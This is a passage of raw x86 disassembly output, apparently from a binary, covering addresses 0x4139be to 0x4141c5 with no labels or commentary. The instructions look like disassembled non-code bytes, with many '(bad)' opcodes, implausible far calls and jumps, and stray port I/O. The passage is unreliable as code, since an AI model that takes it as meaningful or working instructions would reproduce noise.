  4139be:	fiadd  DWORD PTR [edx]
  4139c0:	add    BYTE PTR [ebp+0x73],dh
  4139c3:	pop    ss
  4139c4:	xor    BYTE PTR [eax],al
  4139c6:	add    BYTE PTR [eax],al
  4139c8:	add    BYTE PTR [eax],al
  4139ca:	je     0x4139a7
  4139cc:	js     0x413a17
  4139ce:	jge    0x4139a8
  4139d0:	ds mov eax,0xfc2f028e
  4139d6:	stc    
  4139d7:	aam    0xe7
  4139d9:	add    esi,DWORD PTR [ebp+0x79]
  4139dc:	aam    0xfb
  4139de:	std    
  4139df:	dec    edi
  4139e0:	inc    edi
  4139e1:	lds    esi,FWORD PTR [esi+0x7478e8c9]
  4139e7:	sbb    esp,DWORD PTR [edi+edx*8+0x4e6aaa74]
  4139ee:	or     edi,esi
  4139f0:	fld    QWORD PTR [eax-0x33d937d4]
  4139f6:	in     al,dx
  4139f7:	aas    
  4139f8:	paddb  mm0,mm1
  4139fb:	inc    edx
  4139fc:	in     eax,dx
  4139fd:	pop    ebx
  4139fe:	jne    0x413a02
  413a00:	out    0x43,eax
  413a02:	inc    ebp
  413a03:	lds    edi,FWORD PTR [esi+0x43]
  413a06:	out    dx,al
  413a07:	daa    
  413a08:	adc    ebx,ebx
  413a0a:	jg     0x4139bd
  413a0c:	call   0x60fc3614
  413a11:	ds aad 0x7f
  413a14:	mov    al,0xfb
  413a16:	not    BYTE PTR [ebx+0x797503e7]
  413a1c:	xor    al,0xb0
  413a1e:	fs ret 0x4160
  413a22:	mov    eax,ds:0x727edcd9
  413a27:	add    ecx,0xf1e42702
  413a2d:	mov    dh,0x0
  413a2f:	add    BYTE PTR [eax],al
  413a31:	add    BYTE PTR [eax],al
  413a33:	or     al,ch
  413a35:	mov    ah,0x45
  413a37:	jno    0x413a3c
  413a39:	sbb    al,0xff
  413a3b:	dec    ebp
  413a3c:	test   al,0xea
  413a3e:	mov    ebp,0x56edc9f4
  413a43:	pop    ebx
  413a44:	fchs   
  413a46:	js     0x4139f2
  413a48:	cld    
  413a49:	outs   dx,DWORD PTR ds:[esi]
  413a4a:	inc    ecx
  413a4b:	imul   esi,DWORD PTR [edi+0x29],0x4f58ce
  413a52:	jge    0x413abe
  413a54:	mov    ebp,0xf73a1c38
  413a59:	xchg   edx,eax
  413a5a:	sub    al,al
  413a5c:	cmp    DWORD PTR [eax-0x27fe8af],esp
  413a62:	push   esi
  413a63:	addr16 (bad) 
  413a65:	jae    0x413aac
  413a67:	test   al,0x41
  413a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a6a:	push   ecx
  413a6b:	push   esi
  413a6c:	dec    edi
  413a6d:	std    
  413a6e:	ds call 0x8992:0x4c60e039
  413a76:	pushf  
  413a77:	ficom  DWORD PTR [edx]
  413a79:	fnstenv [eax-0x4c]
  413a7c:	call   0x5d4b:0x7ce29487
  413a83:	sub    BYTE PTR [ecx],0xa4
  413a86:	xchg   esp,eax
  413a87:	jne    0x413a96
  413a89:	pop    ebx
  413a8a:	std    
  413a8b:	inc    ebp
  413a8c:	(bad)  
  413a8d:	cmp    BYTE PTR [edx],ch
  413a8f:	inc    esp
  413a90:	clc    
  413a91:	mov    bh,BYTE PTR [esi+edx*1-0x26]
  413a95:	push   cs
  413a96:	fld    DWORD PTR [eax]
  413a98:	add    BYTE PTR [eax],al
  413a9a:	add    BYTE PTR [eax],al
  413a9c:	jbe    0x413aa0
  413a9e:	jmp    0xf46aaac1
  413aa3:	push   esp
  413aa4:	js     0x413b21
  413aa6:	dec    ebp
  413aa7:	adc    eax,0xf1c75b38
  413aac:	sub    eax,0x7d1384f
  413ab1:	push   ecx
  413ab2:	std    
  413ab3:	mov    esi,0x4c74c21a
  413ab8:	adc    dh,BYTE PTR [edi]
  413aba:	cmp    al,0x62
  413abc:	mov    cl,0x5a
  413abe:	rol    BYTE PTR [ecx],0x7a
  413ac1:	cld    
  413ac2:	ds jo  0x413b04
  413ac5:	push   es
  413ac6:	push   0xfffffff1
  413ac8:	in     eax,dx
  413ac9:	aaa    
  413aca:	mov    al,ds:0x95daa138
  413acf:	add    BYTE PTR [edx-0x47],ah
  413ad2:	sti    
  413ad3:	jmp    0x413b24
  413ad5:	inc    ebp
  413ad6:	jns    0x413ae0
  413ad8:	xlat   BYTE PTR ds:[ebx]
  413ad9:	inc    edx
  413ada:	call   0x4128976a
  413adf:	in     al,dx
  413ae0:	dec    ebp
  413ae1:	inc    ebx
  413ae2:	call   0x8ed546a
  413ae7:	setg   ah
  413aea:	stc    
  413aeb:	(bad)  
  413aec:	mov    ebx,0xe3ff48a4
  413af1:	test   DWORD PTR [esi-0x3357e7b9],0x6a001c0f
  413afb:	sbb    BYTE PTR [ecx+0x50a042],ch
  413b01:	add    BYTE PTR [eax],al
  413b03:	add    BYTE PTR [eax],al
  413b05:	test   DWORD PTR [eax],ebx
  413b07:	cmp    al,0xe8
  413b09:	xor    BYTE PTR [ecx],0xfb
  413b0c:	call   DWORD PTR [ebp+0x40]
  413b0f:	cmp    BYTE PTR [ebx],bh
  413b11:	lahf   
  413b12:	xor    eax,DWORD PTR [ecx]
  413b14:	call   DWORD PTR [ebx]
  413b16:	cld    
  413b17:	out    0x23,al
  413b19:	dec    ecx
  413b1a:	xor    ah,BYTE PTR [eax-0x237d218]
  413b20:	push   DWORD PTR [edi-0x2a]
  413b23:	mov    dh,BYTE PTR [ebp-0x14]
  413b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b27:	or     DWORD PTR [edi],0xffffffcc
  413b2a:	(bad)  
  413b2b:	cli    
  413b2c:	ja     0x413ab2
  413b2e:	inc    ebp
  413b2f:	inc    ebx
  413b30:	cmp    al,0xb4
  413b32:	push   ebx
  413b33:	or     eax,DWORD PTR [eax]
  413b35:	mov    WORD PTR [eax+0x5b],cs
  413b38:	cmp    BYTE PTR ds:0x51ff3c19,ah
  413b3e:	jp     0x413b28
  413b40:	out    dx,eax
  413b41:	inc    ecx
  413b42:	mov    ecx,0xf5cc33fb
  413b47:	inc    edx
  413b48:	cmp    al,0x77
  413b4a:	mov    esi,0xc75d8f3
  413b4f:	sub    bl,BYTE PTR [ecx+0x3c]
  413b52:	xchg   edi,eax
  413b53:	add    BYTE PTR [eax],al
  413b55:	enter  0xd850,0x81
  413b59:	dec    ecx
  413b5a:	and    DWORD PTR [ebx],esi
  413b5c:	push   esi
  413b5d:	stos   BYTE PTR es:[edi],al
  413b5e:	pusha  
  413b5f:	inc    ebp
  413b60:	or     dh,bh
  413b62:	sbb    eax,DWORD PTR [ebx+eax*4+0x35]
  413b66:	int3   
  413b67:	jge    0x413bab
  413b69:	add    BYTE PTR [eax],al
  413b6b:	add    BYTE PTR [eax],al
  413b6d:	add    BYTE PTR [edi-0x27],dh
  413b70:	add    DWORD PTR [ecx+0xd0401b2],eax
  413b76:	icebp  
  413b77:	lock add eax,0x1b17500
  413b7d:	add    BYTE PTR [ebp-0x57],dh
  413b80:	pop    ecx
  413b81:	hlt    
  413b82:	test   al,0xd9
  413b84:	add    DWORD PTR [eax-0x8],edx
  413b87:	jne    0x413b32
  413b89:	call   0x424552
  413b8e:	idiv   BYTE PTR [ebp-0x53]
  413b91:	add    dh,bh
  413b93:	call   0x890e7f12
  413b98:	jl     0x413b68
  413b9a:	mov    ebx,0xec00b995
  413b9f:	popf   
  413ba0:	mov    ch,0x87
  413ba2:	dec    eax
  413ba3:	jmp    0xd9a8b683
  413ba8:	add    DWORD PTR [ebp+esi*4+0x74fa7dcb],eax
  413baf:	fld    DWORD PTR [ecx]
  413bb1:	xor    DWORD PTR [ebp+0x7a74cf55],esi
  413bb7:	pop    ecx
  413bb8:	pop    es
  413bb9:	add    BYTE PTR [eax],ch
  413bbb:	aam    0x41
  413bbd:	sbb    BYTE PTR [ebx],0xda
  413bc0:	add    DWORD PTR [esi+esi*2+0x13],esi
  413bc4:	fucomi st,st(7)
  413bc6:	push   eax
  413bc7:	fiadd  DWORD PTR [ecx]
  413bc9:	add    ch,dh
  413bcb:	add    DWORD PTR [eax],esp
  413bcd:	push   DWORD PTR [edx]
  413bcf:	jg     0x413b80
  413bd1:	leave  
  413bd2:	add    BYTE PTR [eax],al
  413bd4:	add    BYTE PTR [eax],al
  413bd6:	add    BYTE PTR [ebp+0x6ab46c11],dh
  413bdc:	ret    0xc1e7
  413bdf:	mov    dh,0xbd
  413be1:	out    0xdc,eax
  413be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413be4:	(bad)  
  413be5:	and    al,0xbc
  413be7:	pop    ebp
  413be8:	ret    0x3d8
  413beb:	jne    0x413b78
  413bed:	and    al,0xe0
  413bef:	test   dl,0xf6
  413bf2:	jg     0x413c02
  413bf4:	add    al,0xe7
  413bf6:	add    esi,DWORD PTR [eax]
  413bf8:	cmp    ah,bl
  413bfa:	jl     0x413c62
  413bfc:	scas   al,BYTE PTR es:[edi]
  413bfd:	stc    
  413bfe:	inc    ebx
  413bff:	jne    0x413bc2
  413c01:	mov    esi,0x15c1c5fb
  413c06:	xor    eax,DWORD PTR [edx+eax*8+0x62]
  413c0a:	mov    esp,0xc830221d
  413c0f:	add    BYTE PTR [edi-0x709bb1d9],al
  413c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c16:	mov    ebx,0x3f8d1dd
  413c1b:	jne    0x413baa
  413c1d:	das    
  413c1e:	jle    0x413bdc
  413c20:	aaa    
  413c21:	sub    edx,ebx
  413c23:	pop    esi
  413c24:	add    esp,edi
  413c26:	add    ebx,DWORD PTR [edi-0x18]
  413c29:	add    BYTE PTR ds:0x32f747fe,0xc0
  413c30:	cmp    DWORD PTR [ebx],ecx
  413c32:	jnp    0x413c64
  413c34:	jmp    0x7dd6:0xc1f779ce
  413c3b:	add    BYTE PTR [eax],al
  413c3d:	add    BYTE PTR [eax],al
  413c3f:	add    BYTE PTR [esi],dh
  413c41:	mov    ds:0x11a0cc6a,al
  413c46:	imul   esp,DWORD PTR [esi],0xffffff9a
  413c49:	shl    edi,0x59
  413c4c:	dec    esp
  413c4d:	sub    al,0x0
  413c4f:	jmp    0x413c5e
  413c51:	inc    ebp
  413c52:	fcomp  DWORD PTR [ecx]
  413c54:	mov    edx,0xcba6e435
  413c59:	mov    edi,0x2e518573
  413c5e:	adc    BYTE PTR [esi-0x7abc76ce],0xf6
  413c65:	mov    ecx,0xf4daf6fd
  413c6a:	(bad)  
  413c6b:	call   0xc186c7e6
  413c70:	fstp   TBYTE PTR [bx+di]
  413c73:	stos   BYTE PTR es:[edi],al
  413c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c75:	add    eax,0xab2ac487
  413c7a:	or     BYTE PTR [ecx-0x59],dl
  413c7d:	ss std 
  413c7f:	push   esi
  413c80:	test   al,0x45
  413c82:	hlt    
  413c83:	sbb    bh,BYTE PTR [ecx]
  413c85:	mov    DWORD PTR [ebx+0x51],ebx
  413c88:	push   0x92eef445
  413c8d:	add    edi,edi
  413c8f:	call   0x3d84c60a
  413c94:	jo     0x413cdb
  413c96:	loopne 0x413c8e
  413c98:	js     0x413c68
  413c9a:	add    cl,ch
  413c9c:	jbe    0x413c29
  413c9e:	jae    0x413ca5
  413ca0:	outs   dx,BYTE PTR ds:[esi]
  413ca1:	inc    ebp
  413ca2:	lock push 0x0
  413ca5:	add    BYTE PTR [eax],al
  413ca7:	add    BYTE PTR [eax],al
  413ca9:	ins    DWORD PTR es:[edi],dx
  413caa:	jb     0x413cac
  413cac:	neg    BYTE PTR [edx+0x6d]
  413caf:	add    cl,ch
  413cb1:	jbe    0x413c3e
  413cb3:	add    al,0x39
  413cb5:	dec    edi
  413cb6:	or     al,BYTE PTR [eax+eiz*1-0x165f7b36]
  413cbd:	jbe    0x413cc1
  413cbf:	xor    esi,ebx
  413cc1:	iret   
  413cc2:	or     DWORD PTR [eax+eiz*4+0x6345093a],eax
  413cc9:	stos   BYTE PTR es:[edi],al
  413cca:	clc    
  413ccb:	jg     0x413ccd
  413ccd:	mov    ch,0x9
  413ccf:	jno    0x413cc4
  413cd1:	pop    esp
  413cd3:	test   DWORD PTR [ebp-0x20],eax
  413cd6:	or     eax,0xf54ae441
  413cdb:	xchg   BYTE PTR [ebp-0x4c],cl
  413cde:	cmp    DWORD PTR [ecx+eax*4],eax
  413ce1:	fisttp WORD PTR [ebx]
  413ce3:	add    BYTE PTR [eax+eax*2+0x3d],dh
  413ce7:	add    BYTE PTR [eax+0x35740444],al
  413ced:	out    0xfa,eax
  413cef:	out    dx,eax
  413cf0:	mov    esi,DWORD PTR [eax]
  413cf2:	xchg   edi,eax
  413cf3:	push   eax
  413cf4:	sbb    ax,WORD PTR [ebx-0x58]
  413cf8:	aas    
  413cf9:	ss aas 
  413cfb:	inc    ecx
  413cfc:	lods   al,BYTE PTR ds:[esi]
  413cfd:	shl    DWORD PTR [edx+0x3dc12e9],cl
  413d03:	mov    DWORD PTR [ebp-0xc],ecx
  413d06:	ds inc ecx
  413d08:	mov    al,0x95
  413d0a:	jmp    0x0:0x89b3
  413d11:	add    BYTE PTR [ecx],dh
  413d13:	mov    ebx,es
  413d15:	inc    ebp
  413d16:	pop    eax
  413d17:	add    al,0x0
  413d19:	add    BYTE PTR [esp+ebx*8],bl
  413d1c:	xchg   BYTE PTR [ecx+0x5d87c853],cl
  413d22:	fs aas 
  413d24:	shl    BYTE PTR [ebp-0x29],0x3c
  413d28:	inc    ecx
  413d29:	fcomp  QWORD PTR [edi+edi*1]
  413d2c:	inc    ecx
  413d2d:	fadd   st(7),st
  413d2f:	inc    edx
  413d30:	in     al,0x72
  413d32:	inc    ecx
  413d33:	adc    bh,0x74
  413d36:	les    edi,FWORD PTR [ecx+eax*2]
  413d39:	hlt    
  413d3a:	call   0x413d:0xf2600bf
  413d41:	lock rcl DWORD PTR [edx],cl
  413d44:	mov    al,0xff
  413d46:	test   eax,0x754012d7
  413d4b:	test   eax,0xf9a54b78
  413d50:	ret    0xe434
  413d53:	xor    al,0x35
  413d55:	hlt    
  413d56:	jbe    0x413dcc
  413d58:	xor    eax,ebp
  413d5a:	pop    edx
  413d5b:	std    
  413d5c:	ret    0x76fd
  413d5f:	xchg   ecx,eax
  413d60:	jns    0x413dbd
  413d62:	lea    esi,[eax*2-0x28198df8]
  413d69:	mov    DWORD PTR [eax+0x55430785],esi
  413d6f:	loopne 0x413df0
  413d71:	xor    al,0x5a
  413d73:	mov    bl,al
  413d75:	cmp    DWORD PTR [eax],eax
  413d77:	add    BYTE PTR [eax],al
  413d79:	add    BYTE PTR [eax],al
  413d7b:	mov    dl,0xd1
  413d7d:	dec    esi
  413d7e:	or     cl,BYTE PTR [edx-0x42]
  413d81:	int    0xe8
  413d83:	xor    bh,BYTE PTR [esp+eax*8+0x7d054efd]
  413d8a:	fldcw  WORD PTR [eax+0x2173c4b4]
  413d90:	inc    ecx
  413d91:	shl    DWORD PTR [ecx+0x22],0x50
  413d95:	and    DWORD PTR [ebx+0x21],ebx
  413d98:	xor    al,0x3d
  413d9a:	hlt    
  413d9b:	cld    
  413d9c:	addr16 sbb eax,0xbe01aa87
  413da2:	inc    ebx
  413da3:	(bad)  
  413da4:	test   eax,0x34114378
  413da9:	inc    ebp
  413daa:	fcomp  st(5)
  413dac:	jmp    0xe03d:0x23eafd4e
  413db3:	out    dx,al
  413db4:	(bad)  
  413db5:	shr    eax,1
  413db7:	and    bh,BYTE PTR [esp+eax*8]
  413dba:	std    
  413dbb:	add    BYTE PTR [esi],dh
  413dbd:	mov    ecx,0x1d996e8
  413dc2:	add    bh,ch
  413dc4:	gs enter 0x6fe9,0x2
  413dc9:	je     0x413e19
  413dcb:	mov    ebp,0xaaf3f5a9
  413dd0:	mov    esi,0x6040c419
  413dd5:	xor    bh,BYTE PTR [ebx+0x2ee705b7]
  413ddb:	cld    
  413ddc:	lods   eax,DWORD PTR ds:[esi]
  413ddd:	push   0xd7
  413de2:	add    BYTE PTR [eax],al
  413de4:	push   ebp
  413de5:	or     ah,bh
  413de7:	add    esi,esp
  413de9:	and    al,0xaf
  413deb:	add    esp,DWORD PTR [eax+ebx*2]
  413dee:	ds pop esp
  413df0:	dec    ecx
  413df1:	iret   
  413df2:	sub    al,BYTE PTR [ebx+esi*1]
  413df5:	dec    eax
  413df6:	sahf   
  413df7:	les    esp,FWORD PTR [eax+0x18]
  413dfa:	repz lock call 0xe742:0x41d34802
  413e03:	js     0x413d8b
  413e05:	scas   al,BYTE PTR es:[edi]
  413e06:	mov    ds:0x248b7540,eax
  413e0b:	aam    0xf4
  413e0d:	mov    edx,0x8966d8f3
  413e12:	in     eax,0x80
  413e14:	sub    eax,0x5c10d90f
  413e19:	inc    edi
  413e1a:	push   edi
  413e1b:	dec    esp
  413e1c:	dec    ebx
  413e1d:	mov    ah,0xad
  413e1f:	call   DWORD PTR [ebx]
  413e21:	xor    bl,bh
  413e23:	js     0x413dd3
  413e25:	or     dh,BYTE PTR [esi]
  413e27:	push   eax
  413e28:	jno    0x413db9
  413e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e2b:	idiv   ecx
  413e2d:	xor    edi,ebp
  413e2f:	adc    al,dh
  413e31:	push   edx
  413e32:	cmovnp esi,DWORD PTR [ebx-0x4a8118fe]
  413e39:	cmp    ecx,DWORD PTR [ecx-0x54148c88]
  413e3f:	shl    DWORD PTR [edx+esi*4+0x6a],cl
  413e43:	inc    esi
  413e44:	lds    ecx,FWORD PTR [esi]
  413e46:	add    BYTE PTR [eax+0x0],ah
  413e49:	add    BYTE PTR [eax],al
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	xor    ebp,DWORD PTR [edx+0x593d2771]
  413e53:	or     BYTE PTR [ecx-0x33],dl
  413e56:	into   
  413e57:	inc    ecx
  413e58:	jmp    0xfa595014
  413e5d:	add    cl,BYTE PTR ss:[ecx-0x3f7eced6]
  413e64:	idiv   dl
  413e66:	aad    0xff
  413e68:	call   0xe94168e3
  413e6d:	jbe    0x413e81
  413e6f:	push   0x21cba
  413e74:	cmp    DWORD PTR [ecx+ebx*2],eax
  413e77:	int3   
  413e78:	xchg   ecx,eax
  413e79:	sbb    cl,ah
  413e7b:	(bad)  
  413e7c:	call   0x6b0d8774
  413e81:	mov    edx,cs
  413e83:	add    BYTE PTR [eax-0x5c],dh
  413e86:	ret    0x724f
  413e89:	cmp    esp,eax
  413e8b:	inc    ebx
  413e8c:	xor    eax,0xa5438579
  413e91:	or     DWORD PTR [ebp+ecx*1-0x17],esi
  413e95:	jbe    0x413e1d
  413e97:	shr    dh,0xf2
  413e9a:	xchg   edi,eax
  413e9b:	(bad)  
  413e9c:	call   0xe8c6e417
  413ea1:	jbe    0x413ea5
  413ea3:	push   0xffffffea
  413ea5:	xchg   edi,eax
  413ea6:	mov    DWORD PTR [ebx-0x24131b9],esi
  413eac:	inc    ecx
  413ead:	push   eax
  413eae:	in     al,0xff
  413eb0:	call   0x413eb5
  413eb5:	add    bl,ch
  413eb7:	mov    cl,0xe8
  413eb9:	pop    edi
  413eba:	pop    ecx
  413ebb:	add    al,BYTE PTR [eax]
  413ebd:	fnsave [edx+0x33]
  413ec0:	add    DWORD PTR [ebx+0x678b5f78],eax
  413ec6:	ret    
  413ec7:	mov    esp,0xeedc00fd
  413ecc:	adc    edx,DWORD PTR [eax-0x1a]
  413ecf:	add    BYTE PTR [ecx-0x43fff4b],cl
  413ed5:	dec    DWORD PTR [edi-0x32]
  413ed8:	sti    
  413ed9:	call   0x3c8144
  413ede:	adc    ecx,eax
  413ee0:	jle    0x413f42
  413ee2:	xadd   BYTE PTR [edx],al
  413ee5:	jne    0x413e6f
  413ee7:	xchg   ecx,eax
  413ee8:	mov    cl,0x94
  413eea:	mov    edx,0x2b8fbbf
  413eef:	add    DWORD PTR [eax],eax
  413ef1:	add    BYTE PTR [esi+eax*4-0x6e73feae],dh
  413ef8:	xor    DWORD PTR [ebx+ebx*1],0xe750fbc1
  413eff:	leave  
  413f00:	push   eax
  413f01:	jmp    0x413f39
  413f03:	test   ebx,edi
  413f05:	add    eax,DWORD PTR [ecx-0x6f4a76e5]
  413f0b:	ret    0xfffb
  413f0e:	mov    ah,0x38
  413f10:	add    BYTE PTR [eax],al
  413f12:	dec    esp
  413f13:	push   0x4d525d
  413f18:	mov    DWORD PTR [ebp+0x0],eax
  413f1e:	add    BYTE PTR [eax-0x13000441],dl
  413f24:	mov    esi,es
  413f26:	jmp    0x413f91
  413f28:	xchg   edx,eax
  413f29:	xor    DWORD PTR [ebx+ebp*4],0xbb50fbc0
  413f30:	cli    
  413f31:	pop    es
  413f32:	lea    edx,[ecx+0x4bfffadb]
  413f38:	dec    edi
  413f39:	call   0xfc01fff8
  413f3e:	test   DWORD PTR [eax+edx*1-0x40af3f6f],ebx
  413f45:	jno    0x413f50
  413f47:	jne    0x413f21
  413f49:	shl    DWORD PTR [esi-0x14],0x26
  413f4d:	(bad)  
  413f4f:	rol    BYTE PTR [esp+edi*2],cl
  413f52:	out    dx,al
  413f53:	je     0x413efe
  413f55:	add    DWORD PTR [ebx-0x245f408],ecx
  413f5b:	mov    edx,0x350000e3
  413f60:	repnz xor al,0xf7
  413f63:	(bad)  
  413f64:	out    0xab,al
  413f66:	mov    DWORD PTR [ebp+0x28],ebp
  413f69:	test   eax,0x1069f60c
  413f6e:	dec    edi
  413f6f:	and    eax,0x46983d36
  413f74:	imul   ebp,DWORD PTR [esi+ecx*4-0x7bfe55fe],0x8b45f5b5
  413f7f:	add    ch,dh
  413f81:	sar    ebp,0x0
  413f84:	add    BYTE PTR [eax],al
  413f86:	add    BYTE PTR [eax],al
  413f88:	push   0xffffffd8
  413f8a:	mov    bh,0x8a
  413f8c:	mov    ecx,0x71e899de
  413f91:	push   cs
  413f92:	mov    edi,0xc128bbfd
  413f97:	add    al,0xf6
  413f99:	cmp    dl,BYTE PTR [edx+esi*2]
  413f9c:	push   ebx
  413f9d:	js     0x413f60
  413f9f:	data16 in al,dx
  413fa1:	test   eax,0xaa5f9fa9
  413fa6:	add    DWORD PTR [edi+0x42e59b0],eax
  413fac:	lock ins DWORD PTR es:[edi],dx
  413fae:	mov    cl,0x50
  413fb0:	(bad)  
  413fb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fb2:	mov    es,WORD PTR [ebx-0x240bc3f]
  413fb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fb9:	cs test esp,ebx
  413fbc:	push   ebx
  413fbe:	mov    esi,0x57040d50
  413fc3:	add    BYTE PTR [ebp+0x2],dh
  413fc6:	cmovo  esp,esi
  413fc9:	mov    edx,0xbc0bab1e
  413fce:	push   ss
  413fcf:	shr    edi,0x2
  413fd2:	retf   
  413fd3:	loop   0x41401b
  413fd5:	push   ds
  413fd6:	ret    
  413fd7:	out    dx,al
  413fd8:	inc    esi
  413fd9:	push   ss
  413fda:	mov    ebx,0xb30e4943
  413fdf:	popa   
  413fe0:	inc    ecx
  413fe1:	push   es
  413fe2:	mov    ecx,0x9a0a9cdc
  413fe7:	pop    es
  413fe8:	pushf  
  413fe9:	pop    es
  413fea:	call   0x0:0x5
  413ff1:	mov    WORD PTR [ebx],es
  413ff3:	call   0x3802:0x99ff8c04
  413ffa:	xchg   DWORD PTR [esp+ecx*1],edi
  413ffd:	mov    BYTE PTR [ebx],dh
  413fff:	jmp    0x413fc1
  414001:	or     ecx,DWORD PTR [edx]
  414003:	push   ds
  414004:	shl    DWORD PTR [esi-0x52],0xd9
  414008:	inc    ebx
  414009:	jne    0x41405d
  41400b:	fcmovb st,st(3)
  41400d:	cld    
  41400e:	leave  
  41400f:	(bad)  
  414010:	push   esi
  414011:	mov    dx,0x8796
  414015:	xor    eax,0x1310c02f
  41401a:	(bad)  
  41401b:	push   0xffffffab
  41401d:	jne    0x41404d
  41401f:	fisttp WORD PTR [ebx+0x70]
  414022:	jle    0x41400d
  414024:	add    dh,BYTE PTR [ebp+0x2]
  414027:	pop    ds
  414028:	adc    ecx,edi
  41402a:	xchg   edi,esp
  41402c:	add    esi,DWORD PTR [ebp+0x4a]
  41402f:	rol    DWORD PTR [ebp*4-0x517b20d1],cl
  414036:	mov    edx,0xb1b6c9e8
  41403b:	call   0xb4464cc3
  414040:	adc    esi,ebp
  414042:	aas    
  414043:	add    BYTE PTR [ebp-0x32],dh
  414046:	(bad)  
  414047:	or     ebp,ecx
  414049:	jbe    0x413fd6
  41404b:	clc    
  41404c:	ins    BYTE PTR es:[edi],dx
  41404d:	mov    ch,0x35
  41404f:	xchg   BYTE PTR [ebx+ebp*4+0x76],ch
  414053:	call   0x4140b3
  414058:	add    BYTE PTR [eax],al
  41405a:	imul   eax,DWORD PTR [edx],0x0
  41405d:	bound  esi,QWORD PTR [ebx]
  41405f:	or     dh,dh
  414061:	lods   al,BYTE PTR ds:[esi]
  414062:	push   cs
  414063:	mov    edx,0xb96c640e
  414068:	std    
  414069:	jmp    0x624d7457
  41406e:	cmp    DWORD PTR [edx],ecx
  414070:	xchg   DWORD PTR [ecx+edi*2],ebp
  414073:	test   esi,esi
  414075:	pusha  
  414076:	outs   dx,BYTE PTR ds:[esi]
  414077:	push   edx
  414078:	std    
  414079:	cld    
  41407a:	retf   0x4014
  41407d:	jmp    0xbfc4f381
  414082:	jp     0x41400c
  414084:	call   0x8b43b772
  414089:	sub    al,0xa1
  41408b:	push   edx
  41408c:	push   0xfffffffb
  41408e:	push   ds
  41408f:	sti    
  414090:	pusha  
  414091:	call   0xb98ccc0c
  414096:	mul    BYTE PTR [eax+eiz*8]
  414099:	jmp    0x39198d87
  41409e:	dec    cl
  4140a0:	(bad)  
  4140a1:	sub    al,0x2d
  4140a3:	add    al,BYTE PTR [edi-0x4455aadc]
  4140a9:	in     al,0x76
  4140ab:	add    al,BYTE PTR [ecx+ebp*4-0x16647a7e]
  4140b2:	jbe    0x4140b6
  4140b4:	mov    edx,esp
  4140b6:	dec    edx
  4140b7:	stos   BYTE PTR es:[edi],al
  4140b8:	push   ecx
  4140b9:	in     al,0x76
  4140bb:	add    ah,bh
  4140bd:	jle    0x4140bf
  4140bf:	add    BYTE PTR [eax],al
  4140c1:	add    BYTE PTR [eax],al
  4140c3:	jns    0x4140c7
  4140c5:	add    BYTE PTR [eax],al
  4140c7:	es mov ecx,0x8b91575c
  4140cd:	pop    esp
  4140ce:	inc    DWORD PTR [ebx+0x79]
  4140d1:	push   0x0
  4140d3:	or     al,0x78
  4140d5:	adc    DWORD PTR [eax-0x16],eax
  4140d8:	inc    esp
  4140d9:	add    BYTE PTR [ebx-0x7a76ed68],al
  4140df:	cwde   
  4140e0:	ja     0x4140dd
  4140e2:	call   DWORD PTR [ebp-0x75]
  4140e5:	ins    BYTE PTR es:[edi],dx
  4140e6:	push   DWORD PTR [ebx+0x79]
  4140e9:	mov    DWORD PTR [ebp-0x48820],eax
  4140ef:	fsub   st(2),st
  4140f1:	(bad)  
  4140f2:	(bad)  
  4140f3:	sub    cl,BYTE PTR [ecx]
  4140f5:	test   DWORD PTR [ebp-0x486d0],edi
  4140fb:	ret    
  4140fc:	out    dx,al
  4140fd:	pop    es
  4140fe:	(bad)  
  4140ff:	or     ebp,esi
  414101:	cli    
  414102:	inc    ebx
  414104:	add    edi,ebp
  414106:	call   FWORD PTR [edi+esi*2+0x44a9a411]
  41410d:	add    BYTE PTR [ebx-0x7af5023c],al
  414113:	ins    DWORD PTR es:[edi],dx
  414114:	jns    0x414111
  414116:	(bad)  
  414117:	fild   WORD PTR [edx+0x7903ff70]
  41411d:	add    BYTE PTR [edi],cl
  41411f:	retf   0xfc9f
  414122:	inc    DWORD PTR [ebx]
  414124:	xchg   ebx,eax
  414125:	adc    esp,0x0
  41412b:	add    ch,dh
  41412d:	js     0x41412a
  41412f:	push   eax
  414130:	in     al,0xe3
  414132:	mov    cl,0x1
  414134:	dec    esp
  414135:	ud0    esp,DWORD PTR [bp+di-0x3988]
  41413b:	inc    ebp
  41413c:	retf   
  41413d:	add    esp,ebp
  41413f:	or     al,bl
  414141:	js     0x41413e
  414143:	push   esi
  414144:	jne    0x414196
  414146:	cmp    BYTE PTR [eax],cl
  414148:	stos   BYTE PTR es:[edi],al
  414149:	dec    eax
  41414a:	sbb    ah,ch
  41414c:	imul   eax,DWORD PTR [bx+di],0x89e94650
  414153:	int    0xd
  414155:	or     al,0xb8
  414157:	std    
  414158:	repnz sbb eax,0x2e8673c1
  41415e:	dec    eax
  41415f:	aam    0xcd
  414161:	sti    
  414162:	or     al,0x0
  414164:	jne    0x41418a
  414166:	mov    ecx,0xdc8ed283
  41416b:	out    0x25,eax
  41416d:	add    BYTE PTR [esi-0x2ad10f03],bh
  414173:	call   0x42df8e
  414178:	not    BYTE PTR [esi+0x24f7ffb9]
  41417e:	in     al,0x1e
  414180:	daa    
  414181:	or     BYTE PTR [edx],ch
  414183:	sbb    ebp,eax
  414185:	mov    es,WORD PTR [eax+0x5cc892fe]
  41418b:	call   0x423233
  414190:	add    BYTE PTR [eax],al
  414192:	add    BYTE PTR [eax],al
  414194:	add    dh,ch
  414196:	cld    
  414197:	pop    ds
  414198:	push   0x54
  41419a:	and    al,0xc3
  41419c:	mov    DWORD PTR [ebx-0x3f],eax
  41419f:	jb     0x414211
  4141a1:	push   0x60
  4141a3:	test   eax,eax
  4141a5:	call   0x9487c952
  4141aa:	int    0xf8
  4141ac:	jae    0x414227
  4141ae:	sbb    eax,0x2c7173c4
  4141b3:	dec    ebp
  4141b4:	clc    
  4141b5:	gs xor al,0x3f
  4141b8:	sub    al,0x86
  4141ba:	xor    BYTE PTR [ecx-0x3b8bde85],cl
  4141c0:	je     0x414225
  4141c2:	add    cl,ch
  4141c4:	cli    
  4141c5:	push   0x2e
